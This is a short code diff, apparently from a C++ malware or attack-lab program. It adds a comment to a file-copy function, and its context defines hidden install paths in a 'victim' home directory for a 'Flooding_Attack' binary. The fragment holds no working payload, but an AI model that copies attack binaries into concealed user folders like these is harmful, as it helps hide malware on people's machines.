@@ -21,6 +21,7 @@
 #define LOCATION_A "/home/victim/.etc/.module/Flooding_Attack"
 #define LOCATION_B "/home/victim/.firefox/.module/Flooding_Attack"
 
+// Copy a file from srcpath to dstpath.
 bool copyFile(const char* srcpath, const char* dstpath) {
     std::ifstream src(srcpath, std::ios::binary);
     std::ofstream dst(dstpath, std::ios::binary);
